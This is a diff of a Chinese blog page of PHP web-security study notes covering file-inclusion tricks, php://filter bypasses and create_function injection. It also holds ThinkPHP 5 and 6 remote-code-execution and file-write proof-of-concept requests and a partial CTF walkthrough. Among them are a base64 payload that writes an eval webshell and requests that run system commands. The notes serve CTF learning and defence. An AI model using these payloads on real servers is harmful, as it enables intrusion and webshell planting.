@@ -69,18 +69,33 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h1 id="php知识点总结"><a href="#php知识点总结" class="headerlink" title="php知识点总结"></a>php知识点总结</h1><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​&lt;? echo &#x27;123&#x27;;?&gt; #前提是开启配置参数short_open_tags=on​​</span><br><span class="line"></span><br><span class="line">​&lt;script language=&quot;php&quot;&gt;echo &#x27;hello&#x27;; #不需要修改参数开关，但是只能在7.0以下可用。​​</span><br><span class="line"></span><br><span class="line">​&lt;% echo &#x27;123&#x27;;%&gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用​​</span><br></pre></td></tr></table></figure>
+                <h2 id="php知识点总结"><a href="#php知识点总结" class="headerlink" title="php知识点总结"></a>php知识点总结</h2><h3 id="LFI-绕过-Session-包含限制-Getshell"><a href="#LFI-绕过-Session-包含限制-Getshell" class="headerlink" title="LFI 绕过 Session 包含限制 Getshell"></a>LFI 绕过 Session 包含限制 Getshell</h3><h4 id="php存储方式"><a href="#php存储方式" class="headerlink" title="php存储方式"></a>php存储方式</h4><p>Java是将用户的session存入内存中，而PHP则是将session以文件的形式存储在服务器某个文件中，可以在php.ini里面设置session的存储位置session.save_path。</p>
+<p>默认存放路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用session-upload-progress进行文件包含和反序列化渗透"><a href="#利用session-upload-progress进行文件包含和反序列化渗透" class="headerlink" title="利用session.upload_progress进行文件包含和反序列化渗透"></a>利用session.upload_progress进行文件包含和反序列化渗透</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">freebuf<br></a></p>
+<p>可能出现文件上传的漏洞，这个漏洞有点像条件竞争，因为当php开启了这个配置，当我们上传<code>PHP_SESSION_UPLOAD_PROGRESS</code>字段，再POST恶意内容，就会创建临时文件，在临时文件删除之前，用其他的方式，将这个文件，读取或者包含就可以任意文件上传</p>
+<h4 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h4><p>简单了解一下只是,php.ini有以下几个默认选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​&lt;? echo &#x27;123&#x27;;?&gt; #前提是开启配置参数short_open_tags=on​​</span><br><span class="line"></span><br><span class="line">​&lt;script language=&quot;php&quot;&gt;echo &#x27;hello&#x27;; #不需要修改参数开关，但是只能在7.0以下可用。​​</span><br><span class="line"></span><br><span class="line">​&lt;% echo &#x27;123&#x27;;%&gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用​​</span><br></pre></td></tr></table></figure>
 
 <p>使用第二种，html里面可以利用<code>%09</code>绕过空格</p>
 <h3 id="php7-3-2漏洞"><a href="#php7-3-2漏洞" class="headerlink" title="php7.3.2漏洞"></a>php7.3.2漏洞</h3><ul>
-<li>php7.3.2 require_once 绕过不能重复包含文件的限制 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><blockquote>
+<li><p>php7.3.2 require_once 绕过不能重复包含文件的限制 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
+<blockquote>
 <p><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
 </blockquote>
 </li>
-<li>反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果</li>
+<li><p>反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果</p>
+</li>
 </ul>
-<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>反序列化魔术方法</p>
+<h3 id="php反序列化魔术方法"><a href="#php反序列化魔术方法" class="headerlink" title="php反序列化魔术方法"></a>php反序列化魔术方法</h3><p>反序列化魔术方法</p>
 <ul>
+<li>__serialize() 函数会检查类中是否存在一个魔术方法 __serialize()。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键&#x2F;值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 TypeError 错误。</li>
+<li>__unserialize 在反序列化的时候，会优先调用__unserialize函数</li>
 <li>__construct()&#x2F;&#x2F;当一个对象创建时被调用</li>
 <li>__destruct() &#x2F;&#x2F;当一个对象销毁时被调用</li>
 <li>__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用</li>
@@ -122,7 +137,7 @@
 <li>php:&#x2F;&#x2F;filter伪协议<br>条件：<br>allow_url_fopen&#x3D;on&#x2F;off<br>allow_url_include&#x3D;on&#x2F;off</li>
 </ol>
 </blockquote>
-<p>使用<code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code></p>
+<p>使用<code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code><br>其他过滤器<br><code>php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</code><br><code>php://filter/convert.iconv.utf-7.utf-8/resource=flag.php</code></p>
 <blockquote>
 <ol start="3">
 <li>php:&#x2F;&#x2F;input（读取POST数据）<br>条件：<br>allow_url_fopen&#x3D;on&#x2F;off<br>allow_url_include&#x3D;on</li>
@@ -169,11 +184,53 @@
 </ol>
 </blockquote>
 <p>使用<code>?file=http:/127.0.0.1/phpinfo.txt</code></p>
+<h4 id="详解php-x2F-x2F-filter以及一些绕过"><a href="#详解php-x2F-x2F-filter以及一些绕过" class="headerlink" title="详解php:&#x2F;&#x2F;filter以及一些绕过"></a>详解php:&#x2F;&#x2F;filter以及一些绕过</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">详解php:&#x2F;&#x2F;filter以及死亡绕过</a></p>
+<p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<ul>
+<li>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</li>
+<li>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</li>
+</ul>
+<p>php:&#x2F;&#x2F;filter可以作为一个中间流来处理其他流。</p>
+<p><code>resource=&lt;要过滤的数据流&gt;</code>:这个参数是必须的。它指定了你要筛选过滤的数据流。<br><code>read=&lt;读链的筛选列表&gt;</code>:该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><code>write=&lt;写链的筛选列表&gt;</code>:该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><code>&lt;；两个链的筛选列表&gt;</code>:任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">读取文件</span><br><span class="line"></span><br><span class="line">index.php?file1=php://filter/resource=flag.php</span><br><span class="line"></span><br><span class="line">index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">写入文件</span><br><span class="line">index.php?file2=php://filter/resource=test.txt&amp;txt=helloworld</span><br><span class="line"></span><br><span class="line">index.php?file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过exit</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">$content=$_GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。</p>
+<p>这里的$_POST[‘filename’]是可以控制协议的.</p>
+<p>base64绕过<br>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、&#x2F;）将任意字节序列数据编码成ASCII字符串，另有“&#x3D;”符号用作后缀用途。</p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p>
+<p>当$content被加上了<?php exit; ?>以后，我们可以使用php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode来首先对其解码。在解码的过程中，字符&lt; ? ; &gt;空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p>
+<p>由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的phpexit加上另一个字符就会被base64解码，然后后边的我们精心构造的base64字符串也会被成功解码为php代码。</p>
+<p>payload<br><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p>
 <h4 id="部分练习"><a href="#部分练习" class="headerlink" title="部分练习"></a>部分练习</h4><ul>
 <li>php伪协议，一般用于当tp ， ..&#x2F;,和data和input被禁用的情况，可以用于读取网站源文件<br>格式：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]<br>php:&#x2F;&#x2F;input     data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64;________(编码) (data伪协议)<br>输入想要执行的系统命令的编码<br>例：<a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</a></li>
 </ul>
 <p>列出来的可能是编码的格式，解码一下就可以查看源码</p>
 <h3 id="函数漏洞"><a href="#函数漏洞" class="headerlink" title="函数漏洞"></a>函数漏洞</h3><ul>
+<li><p>读取文件函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(文件名)</span><br><span class="line">show_source(&quot;文件名&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>任意文件读取函数漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">需要php.ini开启allow_url_fopen = On 开启</span><br><span class="line">fopen()         </span><br><span class="line">file_get_contents()</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetss()</span><br><span class="line">file()</span><br><span class="line">fpassthru()</span><br><span class="line">parse_ini_file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>create_function()函数注入</p>
+</li>
+</ul>
+<p>create_function会创建一个匿名函数或者自己传入参数的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">eg：</span><br><span class="line">create_function(&#x27;$wuhu&#x27;,$_GET[arg]);</span><br><span class="line"></span><br><span class="line">传参的时候可以这么传：?arg=&#125;phpinfo();//</span><br><span class="line">执行情况：（这是代码部分是自定义的情况）</span><br><span class="line">function wuhu()&#123;</span><br><span class="line">  &#125;phpinfo();//   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">简单来说，就是利用闭合来构建代码执行</span><br><span class="line"></span><br><span class="line">写两个案例</span><br><span class="line"></span><br><span class="line">eg1:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sort_by = $_GET[&#x27;sort_by&#x27;];</span><br><span class="line">$sorter = &#x27;strnatcasecmp&#x27;;</span><br><span class="line">$databases=array(&#x27;1234&#x27;,&#x27;4321&#x27;);</span><br><span class="line">$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;</span><br><span class="line">usort($databases, create_function(&#x27;$a, $b&#x27;, $sort_function));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://localhost/test/1.php?sort_by=&#x27;&quot;]);&#125;phpinfo();/*</span><br><span class="line"></span><br><span class="line">实际组合过程</span><br><span class="line">$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by &#x27;&quot;]);&#125;phpinfo();/*</span><br><span class="line"></span><br><span class="line">匿名函数实际的执行：</span><br><span class="line">function niming($a,$b)&#123;</span><br><span class="line">return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by &#x27;&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();/*</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eg2:</span><br><span class="line">&lt;?php</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$lambda=create_function(&#x27;$a,$b&#x27;,&quot;return (strlen($a)-strlen($b)+&quot; . &quot;strlen($c));&quot;);</span><br><span class="line">$array=array(&#x27;reall long string here,boy&#x27;,&#x27;this&#x27;,&#x27;midding lenth&#x27;,&#x27;larget&#x27;);</span><br><span class="line">usort($array,$lambda);</span><br><span class="line">print_r($array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://localhost/test/2.php?c=1));&#125;phpinfo();/*</span><br><span class="line"></span><br><span class="line">实际组合过程</span><br><span class="line">$lambda=create_function(&#x27;$a,$b&#x27;,&quot;return (strlen($a)-strlen($b)+&quot; . &quot;strlen(1));&#125;phpinfo();/*));&quot;);</span><br><span class="line"></span><br><span class="line">匿名函数实际的执行：</span><br><span class="line"> function ft($a,$b)&#123;</span><br><span class="line">    return (strlen($a)-strlen($b)+&quot; . &quot;strlen(1));&#125;phpinfo();/*));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>修复</p>
+<ol>
+<li>限定文件的访问范围<br>php.ini 配置文件中，可以通过选项open_basedir 来限定文件访问的范围<br>让用户不能访问Web 根目录以外的路径。</li>
+</ol>
+<p><code>open_basedir = c:\www\</code>只能读取c:\www\目录下</p>
+<ol start="2">
+<li>写过滤的waf</li>
+</ol>
+<p>过滤<code>../</code>或者敏感文件</p>
+<ul>
 <li><p><code>include()</code>函数可以使用?file&#x3D;<code>php://filter/read=convert.base64-encode/resource=phpinfo.php</code>直接读取文件</p>
 </li>
 <li><p><code>include</code>命令执行<code>data://text/plain/;base64,________(编码)</code></p>
@@ -242,27 +299,36 @@
 
 <p>这里一定要换行</p>
 <p>第一个GET和第二个GET的作用<br>第一个GET后的&#x2F;phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php)，PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件<br>而第二个GET后的&#x2F;请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</p>
-<h3 id="php魔术变量"><a href="#php魔术变量" class="headerlink" title="php魔术变量"></a>php魔术变量</h3><ul>
-<li>$_SERVER[‘REMOTE_ADDR’]当前目录位置</li>
-<li>$_SERVER[‘QUERY_STRING’]的值为URL中?之后的字符串</li>
-<li>$_SERVER[‘PHP_SELF’]表示网站根目录地址</li>
+<h3 id="php预定义变量"><a href="#php预定义变量" class="headerlink" title="php预定义变量"></a>php预定义变量</h3><ul>
+<li><p>$_SERVER[‘REMOTE_ADDR’]当前目录位置</p>
+</li>
+<li><p>$_SERVER[‘QUERY_STRING’]的值为URL中?之后的字符串</p>
+</li>
+</ul>
+<p>这个获取?之后的字符，不会进行url解码</p>
+<ul>
+<li><p>$_SERVER[‘PHP_SELF’]表示网站根目录地址</p>
+</li>
+<li><p>$_SERVER[“REQUEST_URI”]       #访问此页面所需的URI</p>
+</li>
+<li><p>$_SERVER[“SCRIPT_NAME”]       #包含当前脚本的路径</p>
+</li>
 </ul>
 <h3 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h3><h5 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h5><ul>
-<li>thinkphp5.0.0</li>
-<li>thinkphp5.0.20</li>
+<li>thinkphp5.0.x</li>
+<li>thinkphp5.0.20<br>From Base32URL Encode<br>poc<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>poc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
-
-<h5 id="Thinkphp5-0-23变量覆盖RCE"><a href="#Thinkphp5-0-23变量覆盖RCE" class="headerlink" title="Thinkphp5.0.23变量覆盖RCE"></a>Thinkphp5.0.23变量覆盖RCE</h5><ul>
+<h4 id="Thinkphp5-0-23变量覆盖RCE"><a href="#Thinkphp5-0-23变量覆盖RCE" class="headerlink" title="Thinkphp5.0.23变量覆盖RCE"></a>Thinkphp5.0.23变量覆盖RCE</h4><ul>
 <li>thinkphp5.0.23<br> poc <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=-1</code><br>执行phpinfo()</p>
-<h5 id="thinkphp6-0-0任意文件写入"><a href="#thinkphp6-0-0任意文件写入" class="headerlink" title="thinkphp6.0.0任意文件写入"></a>thinkphp6.0.0任意文件写入</h5><ul>
+<h4 id="thinkphp6-0-0任意文件写入"><a href="#thinkphp6-0-0任意文件写入" class="headerlink" title="thinkphp6.0.0任意文件写入"></a>thinkphp6.0.0任意文件写入</h4><ul>
 <li>thinkphp 6.0.0  (thinkphp6.0.0~thinkphp6.0.1)</li>
 <li>php 7.4.3</li>
 </ul>
-<p>poc </p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /tp6/public/index.php/index/test1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/tp6/public/index.php/index/test1</span><br><span class="line">Cookie: PHPSESSID=1234567890123456789012345678.php; </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">key=&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>漏洞分析</li>
 </ul>
@@ -272,17 +338,54 @@
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128161616.png" alt="20231128161616"></p>
 <p>然后跟进</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128162531.png" alt="20231128162531"><br>再次定位这个</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128162755.png" alt="20231128162755"><br>写入文件的操作，现在就来看如何控制变量的输入,查看文件名是否可以控制，$path 是由 $sesssionId来控制 通过getId()可以传入参数 getId()又可以通过setId()来控制$this-&gt;id</p>
-<p>当传入的参数$id满足32位的长度时，就将该值设为$this-&gt;id。看一下调用setId的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128162755.png" alt="20231128162755"><br>写入文件的操作，现在就来看如何控制变量的输入,查看文件名是否可以控制，<code>$path</code> 是由 <code>$sesssionId</code>来控制 通过<code>getId()</code>可以传入参数 <code>getId()</code>又可以通过<code>setId()</code>来控制<code>$this-&gt;id</code></p>
+<p>接下来我们看一下sessionid的校验，看能不能随意更改</p>
+<p>当传入的参数<code>$id</code>满足32位的长度时，就将该值设为<code>$this-&gt;id</code>。看一下调用setId的地方</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128164253.png" alt="20231128164253"></p>
 <p>继续跟进,搜索到两个地方调用这个函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128164718.png" alt="20231128164718"></p>
 <p>cookiename的值由$this-&gt;session-&gt;getName()控制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429160034.png" alt="20240429160034"></p>
+<p>并且这里还有一个文件名称处理,跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429160133.png" alt="20240429160133"></p>
+<p>并没有去把上传的文件名进行修改，只是在这个目录下面添加了，创建这个文件并且添加<code>sess_</code></p>
+<p>所以到时候上传的文件名称可以控制</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128165047.png" alt="20231128165047"></p>
 <p>cookiename的值就是传入的phpsession的值</p>
 <p>接下来查看文件内容是否可控，写入的内容就是创建session使用的内容。但是session的创建是由实际的后端业务逻辑来决定的，而默认环境下并没有创建session。因此，默认环境下无法做到任意文件写入。</p>
-<p>因为$sessionId的可控，我们同样也可以利用这个点删除文件</p>
-<h5 id="Thinkphp6-0-12LTS反序列化漏洞"><a href="#Thinkphp6-0-12LTS反序列化漏洞" class="headerlink" title="Thinkphp6.0.12LTS反序列化漏洞"></a>Thinkphp6.0.12LTS反序列化漏洞</h5><ul>
+<p>所以想要做到写入文件内容还是需要知道后端的逻辑.</p>
+<p>我们继续分析在<code>Store.php</code>里面，</p>
+<p>因为<code>$sessionId</code>的可控，我们同样也可以利用这个点删除文件</p>
+<p>一般默认存储目录<code>\runtime\session</code></p>
+<h5 id="tp6任意文件写入-练习-BUU-GYCTF2020-EasyThinking"><a href="#tp6任意文件写入-练习-BUU-GYCTF2020-EasyThinking" class="headerlink" title="tp6任意文件写入 练习 BUU [GYCTF2020]EasyThinking"></a>tp6任意文件写入 练习 BUU [GYCTF2020]EasyThinking</h5><p>登录错误的路由之后暴露tp版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429162908.png" alt="20240429162908"></p>
+<p>然后就要寻找任意文件写入,<code>$data</code>的值怎么传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429163440.png" alt="20240429163440"></p>
+<p>但是找不到文件目录，试一下默认的位置<code>/runtime/session/sess_1234567891234567891234567891.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429164233.png" alt="20240429164233"></p>
+<p>发现这个页面可以写入文件</p>
+<p>的确序列化写进来了,为什么是序列化,可以跟进<code>Store.php</code>的<code>$this-&gt;handler-&gt;write($sessionId, $data);</code>函数的<code>$data</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Session数据</span><br><span class="line"> * @var array</span><br><span class="line"> */</span><br><span class="line">protected $data = [];</span><br></pre></td></tr></table></figure>
+
+<p>但是序列化对于我们上马影响不大，我们自己重新构建php就ok</p>
+<p>看能不能直接从登录界面去写，但是没有写上，就只好注册，登录，但是我们可以注意一个点，此时的phpsession已经一直是我们构建的那个文件名了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429165510.png" alt="20240429165510"></p>
+<p>每一个包都看了，发现搜索的key非常像,尝试利用key写马，不需要去修改phpsession,这里我踩了一个坑，因为我POST发包传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429171511.png" alt="20240429171511"></p>
